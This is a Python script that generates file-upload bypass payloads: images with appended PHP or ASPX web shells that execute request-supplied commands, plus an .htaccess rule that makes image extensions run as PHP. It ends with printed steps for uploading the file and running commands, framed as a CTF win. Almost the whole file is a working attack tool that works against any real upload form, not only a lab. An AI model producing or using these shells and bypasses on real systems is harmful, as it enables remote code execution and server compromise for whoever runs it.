#!/usr/bin/env python3
import os
import argparse
import yaml
from PIL import Image
import random

def parse_ratio(s: str):
    if ':' not in s:
        raise argparse.ArgumentTypeError("Ratio must be WIDTH:HEIGHT like 1:1")
    w, h = s.split(':')
    return int(w), int(h)

def generate_polyglot_image(path: str, size: tuple, file_extension: str, payload: str, payload_type: str):
    """
    Generates an image that is also a valid PHP or ASPX shell.
    """
    w, h = size
    img = Image.new('RGB', size, (random.randint(1,255), random.randint(1,255), random.randint(1,255)))

    # Create a unique image
    for i in range(10):
        img.putpixel((random.randint(0, w-1), random.randint(0, h-1)), (random.randint(1,255), random.randint(1,255), random.randint(1,255)))

    # Save based on the image format determined from the final extension
    if file_extension.lower() in ('.jpg', '.jpeg'):
        img.save(path, format="JPEG")
        with open(path, 'ab') as f:
            f.write(payload.encode())
    elif file_extension.lower() == '.gif':
        img.save(path, format="GIF")
        with open(path, 'ab') as f:
            f.write(payload.encode())
    elif file_extension.lower() == '.bmp':
        img.save(path, format="BMP")
        with open(path, 'ab') as f:
            f.write(payload.encode())
    else: # Default to PNG
        img.save(path, format="PNG")
        with open(path, 'ab') as f:
            f.write(payload.encode())

def get_payload(payload_type: str, custom_payload: str = None):
    """
    Returns the appropriate payload based on type.
    """
    if custom_payload:
        return custom_payload
    
    if payload_type.lower() == "aspx":
        return """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process proc = new Process();
        proc.StartInfo.FileName = "/bin/bash";
        proc.StartInfo.Arguments = "-c \"" + cmd + "\"";
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        Response.Write(proc.StandardOutput.ReadToEnd());
    }
%>"""
    else:  # PHP default
        return "<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); die(); } ?>"

def main():
    parser = argparse.ArgumentParser(description="🔥 Advanced File Upload Bypass Generator - Black Hat Edition 🔥", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--ratio', '-r', type=parse_ratio, required=True, help="Image aspect ratio (e.g., '1:1', '4:3', '16:9')")
    parser.add_argument('--scale', '-s', type=int, default=100, help="Multiplier for ratio to get final size in pixels (default: 100)")
    parser.add_argument('--yaml', '-y', default='extension.yaml', help="Path to YAML file with bypass patterns (default: extension.yaml)")
    parser.add_argument('--name', '-n', default='shell', help="Base name to replace {basename} in patterns (default: 'shell')")
    parser.add_argument('--ext', '-e', default='png', help="Custom extension to use for the image part of the polyglot (e.g., 'png', 'jpg', 'xyz').\nThis is used for the .htaccess rule and final image format. (default: 'png')")
    parser.add_argument('--type', '-t', choices=['php', 'aspx'], default='php', help="Web shell type: php or aspx (default: php)")
    parser.add_argument('--payload', '-p', help="Custom payload. If not provided, uses default for selected type.")
    parser.add_argument('--batch', '-b', action='store_true', help="Generate ALL patterns from the YAML file without prompting")

    args = parser.parse_args()

    output_dir = "bypass_payloads"
    os.makedirs(output_dir, exist_ok=True)

    # Load YAML
    try:
        with open(args.yaml, 'r', encoding='utf-8') as f:
            patterns = yaml.safe_load(f)
    except FileNotFoundError:
        print(f"[!] Error: YAML file '{args.yaml}' not found. Please create it.")
        return
    except yaml.YAMLError as e:
        print(f"[!] Error: Invalid YAML syntax in '{args.yaml}'. Please check the file.")
        print(f"    Details: {e}")
        return

    w, h = args.ratio[0] * args.scale, args.ratio[1] * args.scale
    selected_patterns = patterns if args.batch else []

    if not args.batch:
        print("\n[+] Available Bypass Techniques:")
        for i, p in enumerate(patterns):
            print(f"    {i+1}. {p['name']} -> {p['pattern']}")
        print("    0. Generate ALL techniques (--batch mode)")

        try:
            choice = input(f"\n[?] Select a technique (1-{len(patterns)}, or 0 for all): ").strip()
            if choice == "0":
                selected_patterns = patterns
                print("[+] Generating ALL techniques...")
            else:
                idx = int(choice) - 1
                if 0 <= idx < len(patterns):
                    selected_patterns = [patterns[idx]]
                else:
                    print("[-] Invalid choice.")
                    return
        except ValueError:
            print("[-] Please enter a valid number.")
            return

    generated_files = []
    payload = get_payload(args.type, args.payload)

    for pattern_obj in selected_patterns:
        pattern = pattern_obj["pattern"]
        filename = pattern.replace("{basename}", args.name).replace("{ext}", args.ext)
        access_url = pattern_obj["access"].replace("{filename}", filename)

        path = os.path.join(output_dir, filename)
        
        if filename == ".htaccess":
            if args.type == "php":
                with open(path, 'w') as f:
                    f.write(f"AddType application/x-httpd-php .{args.ext}\n")
                print(f"[+] Created: {filename} (HTACCESS RULES for .{args.ext})")
            else:
                print(f"[!] Skipping .htaccess for ASPX (IIS doesn't use .htaccess)")
                continue
        else:
            final_ext = os.path.splitext(filename)[-1].lower()
            generate_polyglot_image(path, (w, h), final_ext, payload, args.type)
            print(f"[+] Created: {filename} ({w}x{h}px, {args.type.upper()} shell, format: {final_ext})")
        
        generated_files.append((filename, access_url, args.type))

    # PRINT THE WINNING INSTRUCTIONS
    print("\n" + "="*60)
    print(f"🎯 HOW TO WIN THE CTF ({args.type.upper()} Shell Access):")
    print("="*60)
    
    for filename, access_url, shell_type in generated_files:
        print(f"\nFor file: {filename}")
        print(f"  1. Upload it to the target website.")
        print(f"  2. Try to access it at a URL like:")
        print(f"     -> {access_url}")
        
        if shell_type == "php":
            print(f"  3. Add '?cmd=whoami' to the URL and test it.")
            print(f"  4. Change 'whoami' to other commands like 'cat /flag.txt'")
        else:  # ASPX
            print(f"  3. Add '?cmd=whoami' to the URL and test it.")
            print(f"  4. Change 'whoami' to other commands like 'type C:\\\\flag.txt' or 'cat /flag.txt'")
        
        print(f"  5. Capture the flag! 🏴‍☠️")
    
    print(f"\nShell Type: {args.type.upper()}")
    print("Pro Tip: Use Burp Suite Intruder or Turbo Intruder to automate the upload of all these files!")

if __name__ == "__main__":
    main()
